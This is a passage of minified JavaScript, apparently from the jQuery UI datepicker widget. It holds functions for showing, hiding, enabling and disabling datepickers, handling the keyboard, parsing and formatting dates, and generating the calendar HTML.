s=t(e);s.hasClass(this.markerClassName)||(s.addClass(this.markerClassName).append(i.dpDiv),t.data(e,r,i),this._setDate(i,this._getDefaultDate(i),!0),this._updateDatepicker(i),this._updateAlternate(i),i.settings.disabled&&this._disableDatepicker(e),i.dpDiv.css("display","block"))},_dialogDatepicker:function(e,i,s,a,o){var h,l,c,u,d,p=this._dialogInst;return p||(this.uuid+=1,h="dp"+this.uuid,this._dialogInput=t("<input type='text' id='"+h+"' style='position: absolute; top: -100px; width: 0px;'/>"),this._dialogInput.keydown(this._doKeyDown),t("body").append(this._dialogInput),p=this._dialogInst=this._newInst(this._dialogInput,!1),p.settings={},t.data(this._dialogInput[0],r,p)),n(p.settings,a||{}),i=i&&i.constructor===Date?this._formatDate(p,i):i,this._dialogInput.val(i),this._pos=o?o.length?o:[o.pageX,o.pageY]:null,this._pos||(l=document.documentElement.clientWidth,c=document.documentElement.clientHeight,u=document.documentElement.scrollLeft||document.body.scrollLeft,d=document.documentElement.scrollTop||document.body.scrollTop,this._pos=[l/2-100+u,c/2-150+d]),this._dialogInput.css("left",this._pos[0]+20+"px").css("top",this._pos[1]+"px"),p.settings.onSelect=s,this._inDialog=!0,this.dpDiv.addClass(this._dialogClass),this._showDatepicker(this._dialogInput[0]),t.blockUI&&t.blockUI(this.dpDiv),t.data(this._dialogInput[0],r,p),this},_destroyDatepicker:function(e){var i,s=t(e),n=t.data(e,r);s.hasClass(this.markerClassName)&&(i=e.nodeName.toLowerCase(),t.removeData(e,r),"input"===i?(n.append.remove(),n.trigger.remove(),s.removeClass(this.markerClassName).unbind("focus",this._showDatepicker).unbind("keydown",this._doKeyDown).unbind("keypress",this._doKeyPress).unbind("keyup",this._doKeyUp)):("div"===i||"span"===i)&&s.removeClass(this.markerClassName).empty())},_enableDatepicker:function(e){var i,s,n=t(e),a=t.data(e,r);n.hasClass(this.markerClassName)&&(i=e.nodeName.toLowerCase(),"input"===i?(e.disabled=!1,a.trigger.filter("button").each(function(){this.disabled=!1}).end().filter("img").css({opacity:"1.0",cursor:""})):("div"===i||"span"===i)&&(s=n.children("."+this._inlineClass),s.children().removeClass("ui-state-disabled"),s.find("select.ui-datepicker-month, select.ui-datepicker-year").prop("disabled",!1)),this._disabledInputs=t.map(this._disabledInputs,function(t){return t===e?null:t}))},_disableDatepicker:function(e){var i,s,n=t(e),a=t.data(e,r);n.hasClass(this.markerClassName)&&(i=e.nodeName.toLowerCase(),"input"===i?(e.disabled=!0,a.trigger.filter("button").each(function(){this.disabled=!0}).end().filter("img").css({opacity:"0.5",cursor:"default"})):("div"===i||"span"===i)&&(s=n.children("."+this._inlineClass),s.children().addClass("ui-state-disabled"),s.find("select.ui-datepicker-month, select.ui-datepicker-year").prop("disabled",!0)),this._disabledInputs=t.map(this._disabledInputs,function(t){return t===e?null:t}),this._disabledInputs[this._disabledInputs.length]=e)},_isDisabledDatepicker:function(t){if(!t)return!1;for(var e=0;this._disabledInputs.length>e;e++)if(this._disabledInputs[e]===t)return!0;return!1},_getInst:function(e){try{return t.data(e,r)}catch(i){throw"Missing instance data for this datepicker"}},_optionDatepicker:function(i,s,a){var r,o,h,l,c=this._getInst(i);return 2===arguments.length&&"string"==typeof s?"defaults"===s?t.extend({},t.datepicker._defaults):c?"all"===s?t.extend({},c.settings):this._get(c,s):null:(r=s||{},"string"==typeof s&&(r={},r[s]=a),c&&(this._curInst===c&&this._hideDatepicker(),o=this._getDateDatepicker(i,!0),h=this._getMinMaxDate(c,"min"),l=this._getMinMaxDate(c,"max"),n(c.settings,r),null!==h&&r.dateFormat!==e&&r.minDate===e&&(c.settings.minDate=this._formatDate(c,h)),null!==l&&r.dateFormat!==e&&r.maxDate===e&&(c.settings.maxDate=this._formatDate(c,l)),"disabled"in r&&(r.disabled?this._disableDatepicker(i):this._enableDatepicker(i)),this._attachments(t(i),c),this._autoSize(c),this._setDate(c,o),this._updateAlternate(c),this._updateDatepicker(c)),e)},_changeDatepicker:function(t,e,i){this._optionDatepicker(t,e,i)},_refreshDatepicker:function(t){var e=this._getInst(t);e&&this._updateDatepicker(e)},_setDateDatepicker:function(t,e){var i=this._getInst(t);i&&(this._setDate(i,e),this._updateDatepicker(i),this._updateAlternate(i))},_getDateDatepicker:function(t,e){var i=this._getInst(t);return i&&!i.inline&&this._setDateFromField(i,e),i?this._getDate(i):null},_doKeyDown:function(e){var i,s,n,a=t.datepicker._getInst(e.target),r=!0,o=a.dpDiv.is(".ui-datepicker-rtl");if(a._keyEvent=!0,t.datepicker._datepickerShowing)switch(e.keyCode){case 9:t.datepicker._hideDatepicker(),r=!1;break;case 13:return n=t("td."+t.datepicker._dayOverClass+":not(."+t.datepicker._currentClass+")",a.dpDiv),n[0]&&t.datepicker._selectDay(e.target,a.selectedMonth,a.selectedYear,n[0]),i=t.datepicker._get(a,"onSelect"),i?(s=t.datepicker._formatDate(a),i.apply(a.input?a.input[0]:null,[s,a])):t.datepicker._hideDatepicker(),!1;case 27:t.datepicker._hideDatepicker();break;case 33:t.datepicker._adjustDate(e.target,e.ctrlKey?-t.datepicker._get(a,"stepBigMonths"):-t.datepicker._get(a,"stepMonths"),"M");break;case 34:t.datepicker._adjustDate(e.target,e.ctrlKey?+t.datepicker._get(a,"stepBigMonths"):+t.datepicker._get(a,"stepMonths"),"M");break;case 35:(e.ctrlKey||e.metaKey)&&t.datepicker._clearDate(e.target),r=e.ctrlKey||e.metaKey;break;case 36:(e.ctrlKey||e.metaKey)&&t.datepicker._gotoToday(e.target),r=e.ctrlKey||e.metaKey;break;case 37:(e.ctrlKey||e.metaKey)&&t.datepicker._adjustDate(e.target,o?1:-1,"D"),r=e.ctrlKey||e.metaKey,e.originalEvent.altKey&&t.datepicker._adjustDate(e.target,e.ctrlKey?-t.datepicker._get(a,"stepBigMonths"):-t.datepicker._get(a,"stepMonths"),"M");break;case 38:(e.ctrlKey||e.metaKey)&&t.datepicker._adjustDate(e.target,-7,"D"),r=e.ctrlKey||e.metaKey;break;case 39:(e.ctrlKey||e.metaKey)&&t.datepicker._adjustDate(e.target,o?-1:1,"D"),r=e.ctrlKey||e.metaKey,e.originalEvent.altKey&&t.datepicker._adjustDate(e.target,e.ctrlKey?+t.datepicker._get(a,"stepBigMonths"):+t.datepicker._get(a,"stepMonths"),"M");break;case 40:(e.ctrlKey||e.metaKey)&&t.datepicker._adjustDate(e.target,7,"D"),r=e.ctrlKey||e.metaKey;break;default:r=!1}else 36===e.keyCode&&e.ctrlKey?t.datepicker._showDatepicker(this):r=!1;r&&(e.preventDefault(),e.stopPropagation())},_doKeyPress:function(i){var s,n,a=t.datepicker._getInst(i.target);return t.datepicker._get(a,"constrainInput")?(s=t.datepicker._possibleChars(t.datepicker._get(a,"dateFormat")),n=String.fromCharCode(null==i.charCode?i.keyCode:i.charCode),i.ctrlKey||i.metaKey||" ">n||!s||s.indexOf(n)>-1):e},_doKeyUp:function(e){var i,s=t.datepicker._getInst(e.target);if(s.input.val()!==s.lastVal)try{i=t.datepicker.parseDate(t.datepicker._get(s,"dateFormat"),s.input?s.input.val():null,t.datepicker._getFormatConfig(s)),i&&(t.datepicker._setDateFromField(s),t.datepicker._updateAlternate(s),t.datepicker._updateDatepicker(s))}catch(n){}return!0},_showDatepicker:function(e){if(e=e.target||e,"input"!==e.nodeName.toLowerCase()&&(e=t("input",e.parentNode)[0]),!t.datepicker._isDisabledDatepicker(e)&&t.datepicker._lastInput!==e){var i,s,a,r,o,h,l;i=t.datepicker._getInst(e),t.datepicker._curInst&&t.datepicker._curInst!==i&&(t.datepicker._curInst.dpDiv.stop(!0,!0),i&&t.datepicker._datepickerShowing&&t.datepicker._hideDatepicker(t.datepicker._curInst.input[0])),s=t.datepicker._get(i,"beforeShow"),a=s?s.apply(e,[e,i]):{},a!==!1&&(n(i.settings,a),i.lastVal=null,t.datepicker._lastInput=e,t.datepicker._setDateFromField(i),t.datepicker._inDialog&&(e.value=""),t.datepicker._pos||(t.datepicker._pos=t.datepicker._findPos(e),t.datepicker._pos[1]+=e.offsetHeight),r=!1,t(e).parents().each(function(){return r|="fixed"===t(this).css("position"),!r}),o={left:t.datepicker._pos[0],top:t.datepicker._pos[1]},t.datepicker._pos=null,i.dpDiv.empty(),i.dpDiv.css({position:"absolute",display:"block",top:"-1000px"}),t.datepicker._updateDatepicker(i),o=t.datepicker._checkOffset(i,o,r),i.dpDiv.css({position:t.datepicker._inDialog&&t.blockUI?"static":r?"fixed":"absolute",display:"none",left:o.left+"px",top:o.top+"px"}),i.inline||(h=t.datepicker._get(i,"showAnim"),l=t.datepicker._get(i,"duration"),i.dpDiv.zIndex(t(e).zIndex()+1),t.datepicker._datepickerShowing=!0,t.effects&&t.effects.effect[h]?i.dpDiv.show(h,t.datepicker._get(i,"showOptions"),l):i.dpDiv[h||"show"](h?l:null),t.datepicker._shouldFocusInput(i)&&i.input.focus(),t.datepicker._curInst=i))}},_updateDatepicker:function(e){this.maxRows=4,a=e,e.dpDiv.empty().append(this._generateHTML(e)),this._attachHandlers(e),e.dpDiv.find("."+this._dayOverClass+" a").mouseover();var i,s=this._getNumberOfMonths(e),n=s[1],r=17;e.dpDiv.removeClass("ui-datepicker-multi-2 ui-datepicker-multi-3 ui-datepicker-multi-4").width(""),n>1&&e.dpDiv.addClass("ui-datepicker-multi-"+n).css("width",r*n+"em"),e.dpDiv[(1!==s[0]||1!==s[1]?"add":"remove")+"Class"]("ui-datepicker-multi"),e.dpDiv[(this._get(e,"isRTL")?"add":"remove")+"Class"]("ui-datepicker-rtl"),e===t.datepicker._curInst&&t.datepicker._datepickerShowing&&t.datepicker._shouldFocusInput(e)&&e.input.focus(),e.yearshtml&&(i=e.yearshtml,setTimeout(function(){i===e.yearshtml&&e.yearshtml&&e.dpDiv.find("select.ui-datepicker-year:first").replaceWith(e.yearshtml),i=e.yearshtml=null},0))},_shouldFocusInput:function(t){return t.input&&t.input.is(":visible")&&!t.input.is(":disabled")&&!t.input.is(":focus")},_checkOffset:function(e,i,s){var n=e.dpDiv.outerWidth(),a=e.dpDiv.outerHeight(),r=e.input?e.input.outerWidth():0,o=e.input?e.input.outerHeight():0,h=document.documentElement.clientWidth+(s?0:t(document).scrollLeft()),l=document.documentElement.clientHeight+(s?0:t(document).scrollTop());return i.left-=this._get(e,"isRTL")?n-r:0,i.left-=s&&i.left===e.input.offset().left?t(document).scrollLeft():0,i.top-=s&&i.top===e.input.offset().top+o?t(document).scrollTop():0,i.left-=Math.min(i.left,i.left+n>h&&h>n?Math.abs(i.left+n-h):0),i.top-=Math.min(i.top,i.top+a>l&&l>a?Math.abs(a+o):0),i},_findPos:function(e){for(var i,s=this._getInst(e),n=this._get(s,"isRTL");e&&("hidden"===e.type||1!==e.nodeType||t.expr.filters.hidden(e));)e=e[n?"previousSibling":"nextSibling"];return i=t(e).offset(),[i.left,i.top]},_hideDatepicker:function(e){var i,s,n,a,o=this._curInst;!o||e&&o!==t.data(e,r)||this._datepickerShowing&&(i=this._get(o,"showAnim"),s=this._get(o,"duration"),n=function(){t.datepicker._tidyDialog(o)},t.effects&&(t.effects.effect[i]||t.effects[i])?o.dpDiv.hide(i,t.datepicker._get(o,"showOptions"),s,n):o.dpDiv["slideDown"===i?"slideUp":"fadeIn"===i?"fadeOut":"hide"](i?s:null,n),i||n(),this._datepickerShowing=!1,a=this._get(o,"onClose"),a&&a.apply(o.input?o.input[0]:null,[o.input?o.input.val():"",o]),this._lastInput=null,this._inDialog&&(this._dialogInput.css({position:"absolute",left:"0",top:"-100px"}),t.blockUI&&(t.unblockUI(),t("body").append(this.dpDiv))),this._inDialog=!1)},_tidyDialog:function(t){t.dpDiv.removeClass(this._dialogClass).unbind(".ui-datepicker-calendar")},_checkExternalClick:function(e){if(t.datepicker._curInst){var i=t(e.target),s=t.datepicker._getInst(i[0]);(i[0].id!==t.datepicker._mainDivId&&0===i.parents("#"+t.datepicker._mainDivId).length&&!i.hasClass(t.datepicker.markerClassName)&&!i.closest("."+t.datepicker._triggerClass).length&&t.datepicker._datepickerShowing&&(!t.datepicker._inDialog||!t.blockUI)||i.hasClass(t.datepicker.markerClassName)&&t.datepicker._curInst!==s)&&t.datepicker._hideDatepicker()}},_adjustDate:function(e,i,s){var n=t(e),a=this._getInst(n[0]);this._isDisabledDatepicker(n[0])||(this._adjustInstDate(a,i+("M"===s?this._get(a,"showCurrentAtPos"):0),s),this._updateDatepicker(a))},_gotoToday:function(e){var i,s=t(e),n=this._getInst(s[0]);this._get(n,"gotoCurrent")&&n.currentDay?(n.selectedDay=n.currentDay,n.drawMonth=n.selectedMonth=n.currentMonth,n.drawYear=n.selectedYear=n.currentYear):(i=new Date,n.selectedDay=i.getDate(),n.drawMonth=n.selectedMonth=i.getMonth(),n.drawYear=n.selectedYear=i.getFullYear()),this._notifyChange(n),this._adjustDate(s)},_selectMonthYear:function(e,i,s){var n=t(e),a=this._getInst(n[0]);a["selected"+("M"===s?"Month":"Year")]=a["draw"+("M"===s?"Month":"Year")]=parseInt(i.options[i.selectedIndex].value,10),this._notifyChange(a),this._adjustDate(n)},_selectDay:function(e,i,s,n){var a,r=t(e);t(n).hasClass(this._unselectableClass)||this._isDisabledDatepicker(r[0])||(a=this._getInst(r[0]),a.selectedDay=a.currentDay=t("a",n).html(),a.selectedMonth=a.currentMonth=i,a.selectedYear=a.currentYear=s,this._selectDate(e,this._formatDate(a,a.currentDay,a.currentMonth,a.currentYear)))},_clearDate:function(e){var i=t(e);this._selectDate(i,"")},_selectDate:function(e,i){var s,n=t(e),a=this._getInst(n[0]);i=null!=i?i:this._formatDate(a),a.input&&a.input.val(i),this._updateAlternate(a),s=this._get(a,"onSelect"),s?s.apply(a.input?a.input[0]:null,[i,a]):a.input&&a.input.trigger("change"),a.inline?this._updateDatepicker(a):(this._hideDatepicker(),this._lastInput=a.input[0],"object"!=typeof a.input[0]&&a.input.focus(),this._lastInput=null)},_updateAlternate:function(e){var i,s,n,a=this._get(e,"altField");a&&(i=this._get(e,"altFormat")||this._get(e,"dateFormat"),s=this._getDate(e),n=this.formatDate(i,s,this._getFormatConfig(e)),t(a).each(function(){t(this).val(n)}))},noWeekends:function(t){var e=t.getDay();return[e>0&&6>e,""]},iso8601Week:function(t){var e,i=new Date(t.getTime());return i.setDate(i.getDate()+4-(i.getDay()||7)),e=i.getTime(),i.setMonth(0),i.setDate(1),Math.floor(Math.round((e-i)/864e5)/7)+1},parseDate:function(i,s,n){if(null==i||null==s)throw"Invalid arguments";if(s="object"==typeof s?""+s:s+"",""===s)return null;var a,r,o,h,l=0,c=(n?n.shortYearCutoff:null)||this._defaults.shortYearCutoff,u="string"!=typeof c?c:(new Date).getFullYear()%100+parseInt(c,10),d=(n?n.dayNamesShort:null)||this._defaults.dayNamesShort,p=(n?n.dayNames:null)||this._defaults.dayNames,f=(n?n.monthNamesShort:null)||this._defaults.monthNamesShort,m=(n?n.monthNames:null)||this._defaults.monthNames,g=-1,v=-1,_=-1,b=-1,y=!1,x=function(t){var e=i.length>a+1&&i.charAt(a+1)===t;return e&&a++,e},k=function(t){var e=x(t),i="@"===t?14:"!"===t?20:"y"===t&&e?4:"o"===t?3:2,n=RegExp("^\\d{1,"+i+"}"),a=s.substring(l).match(n);if(!a)throw"Missing number at position "+l;return l+=a[0].length,parseInt(a[0],10)},w=function(i,n,a){var r=-1,o=t.map(x(i)?a:n,function(t,e){return[[e,t]]}).sort(function(t,e){return-(t[1].length-e[1].length)});if(t.each(o,function(t,i){var n=i[1];return s.substr(l,n.length).toLowerCase()===n.toLowerCase()?(r=i[0],l+=n.length,!1):e}),-1!==r)return r+1;throw"Unknown name at position "+l},D=function(){if(s.charAt(l)!==i.charAt(a))throw"Unexpected literal at position "+l;l++};for(a=0;i.length>a;a++)if(y)"'"!==i.charAt(a)||x("'")?D():y=!1;else switch(i.charAt(a)){case"d":_=k("d");break;case"D":w("D",d,p);break;case"o":b=k("o");break;case"m":v=k("m");break;case"M":v=w("M",f,m);break;case"y":g=k("y");break;case"@":h=new Date(k("@")),g=h.getFullYear(),v=h.getMonth()+1,_=h.getDate();break;case"!":h=new Date((k("!")-this._ticksTo1970)/1e4),g=h.getFullYear(),v=h.getMonth()+1,_=h.getDate();break;case"'":x("'")?D():y=!0;break;default:D()}if(s.length>l&&(o=s.substr(l),!/^\s+/.test(o)))throw"Extra/unparsed characters found in date: "+o;if(-1===g?g=(new Date).getFullYear():100>g&&(g+=(new Date).getFullYear()-(new Date).getFullYear()%100+(u>=g?0:-100)),b>-1)for(v=1,_=b;;){if(r=this._getDaysInMonth(g,v-1),r>=_)break;v++,_-=r}if(h=this._daylightSavingAdjust(new Date(g,v-1,_)),h.getFullYear()!==g||h.getMonth()+1!==v||h.getDate()!==_)throw"Invalid date";return h},ATOM:"yy-mm-dd",COOKIE:"D, dd M yy",ISO_8601:"yy-mm-dd",RFC_822:"D, d M y",RFC_850:"DD, dd-M-y",RFC_1036:"D, d M y",RFC_1123:"D, d M yy",RFC_2822:"D, d M yy",RSS:"D, d M y",TICKS:"!",TIMESTAMP:"@",W3C:"yy-mm-dd",_ticksTo1970:1e7*60*60*24*(718685+Math.floor(492.5)-Math.floor(19.7)+Math.floor(4.925)),formatDate:function(t,e,i){if(!e)return"";var s,n=(i?i.dayNamesShort:null)||this._defaults.dayNamesShort,a=(i?i.dayNames:null)||this._defaults.dayNames,r=(i?i.monthNamesShort:null)||this._defaults.monthNamesShort,o=(i?i.monthNames:null)||this._defaults.monthNames,h=function(e){var i=t.length>s+1&&t.charAt(s+1)===e;return i&&s++,i},l=function(t,e,i){var s=""+e;if(h(t))for(;i>s.length;)s="0"+s;return s},c=function(t,e,i,s){return h(t)?s[e]:i[e]},u="",d=!1;if(e)for(s=0;t.length>s;s++)if(d)"'"!==t.charAt(s)||h("'")?u+=t.charAt(s):d=!1;else switch(t.charAt(s)){case"d":u+=l("d",e.getDate(),2);break;case"D":u+=c("D",e.getDay(),n,a);break;case"o":u+=l("o",Math.round((new Date(e.getFullYear(),e.getMonth(),e.getDate()).getTime()-new Date(e.getFullYear(),0,0).getTime())/864e5),3);break;case"m":u+=l("m",e.getMonth()+1,2);break;case"M":u+=c("M",e.getMonth(),r,o);break;case"y":u+=h("y")?e.getFullYear():(10>e.getYear()%100?"0":"")+e.getYear()%100;break;case"@":u+=e.getTime();break;case"!":u+=1e4*e.getTime()+this._ticksTo1970;break;case"'":h("'")?u+="'":d=!0;break;default:u+=t.charAt(s)}return u},_possibleChars:function(t){var e,i="",s=!1,n=function(i){var s=t.length>e+1&&t.charAt(e+1)===i;return s&&e++,s};for(e=0;t.length>e;e++)if(s)"'"!==t.charAt(e)||n("'")?i+=t.charAt(e):s=!1;else switch(t.charAt(e)){case"d":case"m":case"y":case"@":i+="0123456789";break;case"D":case"M":return null;case"'":n("'")?i+="'":s=!0;break;default:i+=t.charAt(e)}return i},_get:function(t,i){return t.settings[i]!==e?t.settings[i]:this._defaults[i]},_setDateFromField:function(t,e){if(t.input.val()!==t.lastVal){var i=this._get(t,"dateFormat"),s=t.lastVal=t.input?t.input.val():null,n=this._getDefaultDate(t),a=n,r=this._getFormatConfig(t);try{a=this.parseDate(i,s,r)||n}catch(o){s=e?"":s}t.selectedDay=a.getDate(),t.drawMonth=t.selectedMonth=a.getMonth(),t.drawYear=t.selectedYear=a.getFullYear(),t.currentDay=s?a.getDate():0,t.currentMonth=s?a.getMonth():0,t.currentYear=s?a.getFullYear():0,this._adjustInstDate(t)}},_getDefaultDate:function(t){return this._restrictMinMax(t,this._determineDate(t,this._get(t,"defaultDate"),new Date))},_determineDate:function(e,i,s){var n=function(t){var e=new Date;return e.setDate(e.getDate()+t),e},a=function(i){try{return t.datepicker.parseDate(t.datepicker._get(e,"dateFormat"),i,t.datepicker._getFormatConfig(e))}catch(s){}for(var n=(i.toLowerCase().match(/^c/)?t.datepicker._getDate(e):null)||new Date,a=n.getFullYear(),r=n.getMonth(),o=n.getDate(),h=/([+\-]?[0-9]+)\s*(d|D|w|W|m|M|y|Y)?/g,l=h.exec(i);l;){switch(l[2]||"d"){case"d":case"D":o+=parseInt(l[1],10);break;case"w":case"W":o+=7*parseInt(l[1],10);break;case"m":case"M":r+=parseInt(l[1],10),o=Math.min(o,t.datepicker._getDaysInMonth(a,r));break;case"y":case"Y":a+=parseInt(l[1],10),o=Math.min(o,t.datepicker._getDaysInMonth(a,r))}l=h.exec(i)}return new Date(a,r,o)},r=null==i||""===i?s:"string"==typeof i?a(i):"number"==typeof i?isNaN(i)?s:n(i):new Date(i.getTime());return r=r&&"Invalid Date"==""+r?s:r,r&&(r.setHours(0),r.setMinutes(0),r.setSeconds(0),r.setMilliseconds(0)),this._daylightSavingAdjust(r)},_daylightSavingAdjust:function(t){return t?(t.setHours(t.getHours()>12?t.getHours()+2:0),t):null},_setDate:function(t,e,i){var s=!e,n=t.selectedMonth,a=t.selectedYear,r=this._restrictMinMax(t,this._determineDate(t,e,new Date));t.selectedDay=t.currentDay=r.getDate(),t.drawMonth=t.selectedMonth=t.currentMonth=r.getMonth(),t.drawYear=t.selectedYear=t.currentYear=r.getFullYear(),n===t.selectedMonth&&a===t.selectedYear||i||this._notifyChange(t),this._adjustInstDate(t),t.input&&t.input.val(s?"":this._formatDate(t))},_getDate:function(t){var e=!t.currentYear||t.input&&""===t.input.val()?null:this._daylightSavingAdjust(new Date(t.currentYear,t.currentMonth,t.currentDay));return e},_attachHandlers:function(e){var i=this._get(e,"stepMonths"),s="#"+e.id.replace(/\\\\/g,"\\");e.dpDiv.find("[data-handler]").map(function(){var e={prev:function(){t.datepicker._adjustDate(s,-i,"M")},next:function(){t.datepicker._adjustDate(s,+i,"M")},hide:function(){t.datepicker._hideDatepicker()},today:function(){t.datepicker._gotoToday(s)},selectDay:function(){return t.datepicker._selectDay(s,+this.getAttribute("data-month"),+this.getAttribute("data-year"),this),!1},selectMonth:function(){return t.datepicker._selectMonthYear(s,this,"M"),!1},selectYear:function(){return t.datepicker._selectMonthYear(s,this,"Y"),!1}};t(this).bind(this.getAttribute("data-event"),e[this.getAttribute("data-handler")])})},_generateHTML:function(t){var e,i,s,n,a,r,o,h,l,c,u,d,p,f,m,g,v,_,b,y,x,k,w,D,T,C,M,S,N,I,P,A,z,H,E,F,O,W,j,R=new Date,L=this._daylightSavingAdjust(new Date(R.getFullYear(),R.getMonth(),R.getDate())),Y=this._get(t,"isRTL"),B=this._get(t,"showButtonPanel"),J=this._get(t,"hideIfNoPrevNext"),K=this._get(t,"navigationAsDateFormat"),Q=this._getNumberOfMonths(t),V=this._get(t,"showCurrentAtPos"),U=this._get(t,"stepMonths"),q=1!==Q[0]||1!==Q[1],X=this._daylightSavingAdjust(t.currentDay?new Date(t.currentYear,t.currentMonth,t.currentDay):new Date(9999,9,9)),G=this._getMinMaxDate(t,"min"),$=this._getMinMaxDate(t,"max"),Z=t.drawMonth-V,te=t.drawYear;if(0>Z&&(Z+=12,te--),$)for(e=this._daylightSavingAdjust(new Date($.getFullYear(),$.getMonth()-Q[0]*Q[1]+1,$.getDate())),e=G&&G>e?G:e;this._daylightSavingAdjust(new Date(te,Z,1))>e;)Z--,0>Z&&(Z=11,te--);for(t.drawMonth=Z,t.drawYear=te,i=this._get(t,"prevText"),i=K?this.formatDate(i,this._daylightSavingAdjust(new Date(te,Z-U,1)),this._getFormatConfig(t)):i,s=this._canAdjustMonth(t,-1,te,Z)?"<a class='ui-datepicker-prev ui-corner-all' data-handler='prev' data-event='click' title='"+i+"'><span class='ui-icon ui-icon-circle-triangle-"+(Y?"e":"w")+"'>"+i+"</span></a>":J?"":"<a class='ui-datepicker-prev ui-corner-all ui-state-disabled' title='"+i+"'><span class='ui-icon ui-icon-circle-triangle-"+(Y?"e":"w")+"'>"+i+"</span></a>",n=this._get(t,"nextText"),n=K?this.formatDate(n,this._daylightSavingAdjust(new Date(te,Z+U,1)),this._getFormatConfig(t)):n,a=this._canAdjustMonth(t,1,te,Z)?"<a class='ui-datepicker-next ui-corner-all' data-handler='next' data-event='click' title='"+n+"'><span class='ui-icon ui-icon-circle-triangle-"+(Y?"w":"e")+"'>"+n+"</span></a>":J?"":"<a class='ui-datepicker-next ui-corner-all ui-state-disabled' title='"+n+"'><span class='ui-icon ui-icon-circle-triangle-"+(Y?"w":"e")+"'>"+n+"</span></a>",r=this._get(t,"currentText"),o=this._get(t,"gotoCurrent")&&t.currentDay?X:L,r=K?this.formatDate(r,o,this._getFormatConfig(t)):r,h=t.inline?"":"<button type='button' class='ui-datepicker-close ui-state-default ui-priority-primary ui-corner-all' data-handler='hide' data-event='click'>"+this._get(t,"closeText")+"</button>",l=B?"<div class='ui-datepicker-buttonpane ui-widget-content'>"+(Y?h:"")+(this._isInRange(t,o)?"<button type='button' class='ui-datepicker-current ui-state-default ui-priority-secondary ui-corner-all' data-handler='today' data-event='click'>"+r+"</button>":"")+(Y?"":h)+"</div>":"",c=parseInt(this._get(t,"firstDay"),10),c=isNaN(c)?0:c,u=this._get(t,"showWeek"),d=this._get(t,"dayNames"),p=this._get(t,"dayNamesMin"),f=this._get(t,"monthNames"),m=this._get(t,"monthNamesShort"),g=this._get(t,"beforeShowDay"),v=this._get(t,"showOtherMonths"),_=this._get(t,"selectOtherMonths"),b=this._getDefaultDate(t),y="",k=0;Q[0]>k;k++){for(w="",this.maxRows=4,D=0;Q[1]>D;D++){if(T=this._daylightSavingAdjust(new Date(te,Z,t.selectedDay)),C=" ui-corner-all",M="",q){if(M+="<div class='ui-datepicker-group",Q[1]>1)switch(D){case 0:M+=" ui-datepicker-group-first",C=" ui-corner-"+(Y?"right":"left");break;case Q[1]-1:M+=" ui-datepicker-group-last",C=" ui-corner-"+(Y?"left":"right");break;default:M+=" ui-datepicker-group-middle",C=""}M+="'>"}for(M+="<div class='ui-datepicker-header ui-widget-header ui-helper-clearfix"+C+"'>"+(/all|left/.test(C)&&0===k?Y?a:s:"")+(/all|right/.test(C)&&0===k?Y?s:a:"")+this._generateMonthYearHeader(t,Z,te,G,$,k>0||D>0,f,m)+"</div><table class='ui-datepicker-calendar'><thead>"+"<tr>",S=u?"<th class='ui-datepicker-week-col'>"+this._get(t,"weekHeader")+"</th>":"",x=0;7>x;x++)N=(x+c)%7,S+="<th"+((x+c+6)%7>=5?" class='ui-datepicker-week-end'":"")+">"+"<span title='"+d[N]+"'>"+p[N]+"</span></th>";for(M+=S+"</tr></thead><tbody>",I=this._getDaysInMonth(te,Z),te===t.selectedYear&&Z===t.selectedMonth&&(t.selectedDay=Math.min(t.selectedDay,I)),P=(this._getFirstDayOfMonth(te,Z)-c+7)%7,A=Math.ceil((P+I)/7),z=q?this.maxRows>A?this.maxRows:A:A,this.maxRows=z,H=this._daylightSavingAdjust(new Date(te,Z,1-P)),E=0;z>E;E++){for(M+="<tr>",F=u?"<td class='ui-datepicker-week-col'>"+this._get(t,"calculateWeek")(H)+"</td>":"",x=0;7>x;x++)O=g?g.apply(t.input?t.input[0]:null,[H]):[!0,""],W=H.getMonth()!==Z,j=W&&!_||!O[0]||G&&G>H||$&&H>$,F+="<td class='"+((x+c+6)%7>=5?" ui-datepicker-week-end":"")+(W?" ui-datepicker-other-month":"")+(H.getTime()===T.getTime()&&Z===t.selectedMonth&&t._keyEvent||b.getTime()===H.getTime()&&b.getTime()===T.getTime()?" "+this._dayOverClass:"")+(j?" "+this._unselectableClass+" ui-state-disabled":"")+(W&&!v?"":" "+O[1]+(H.getTime()===X.getTime()?" "+this._currentClass:"")+(H.getTime()===L.getTime()?" ui-datepicker-today":""))+"'"+(W&&!v||!O[2]?"":" title='"+O[2].replace(/'/g,"&#39;")+"'")+(j?"":" data-handler='selectDay' data-event='click' data-month='"+H.getMonth()+"' data-year='"+H.getFullYear()+"'")+">"+(W&&!v?"&#xa0;":j?"<span class='ui-state-default'>"+H.getDate()+"</span>":"<a class='ui-state-default"+(H.getTime()===L.getTime()?" ui-state-highlight":"")+(H.getTime()===X.getTime()?" ui-state-active":"")+(W?" ui-priority-secondary":"")+"' href='#'>"+H.getDate()+"</a>")+"</td>",H.setDate(H.getDate()+1),H=this._daylightSavingAdjust(H);M+=F+"</tr>"}Z++,Z>11&&(Z=0,te++),M+="</tbody></table>"+(q?"</div>"+(Q[0]>0&&D===Q[1]-1?"<div class='ui-datepicker-row-break'></div>":""):""),w+=M}y+=w}return y+=l,t._keyEvent=!1,y},_generateMonthYearHeader:function(t,e,i,s,n,a,r,o){var h,l,c,u,d,p,f,m,g=this._get(t,"changeMonth"),v=this._get(t,"changeYear"),_=this._get(t,"showMonthAfterYear"),b="<div class='ui-datepicker-title'>",y="";if(a||!g)y+="<span class='ui-datepicker-month'>"+r[e]+"</span>";else{for(h=s&&s.getFullYear()===i,l=n&&n.getFullYear()===i,y+="<select class='ui-datepicker-month' data-handler='selectMonth' data-event='change'>",c=0;12>c;c++)(!h||c>=s.getMonth())&&(!l||n.getMonth()>=c)&&(y+="<option value='"+c+"'"+(c===e?" selected='selected'":"")+">"+o[c]+"</option>");y+="</select>"}if(_||(b+=y+(!a&&g&&v?"":"&#xa0;")),!t.yearshtml)if(t.yearshtml="",a||!v)b+="<span class='ui-datepicker-year'>"+i+"</span>";else{for(u=this._get(t,"yearRange").split(":"),d=(new Date).getFullYear(),p=function(t){var e=t.match(/c[+\-].*/)?i+parseInt(t.substring(1),10):t.match(/[+\-].*/)?d+parseInt(t,10):parseInt(t,10);
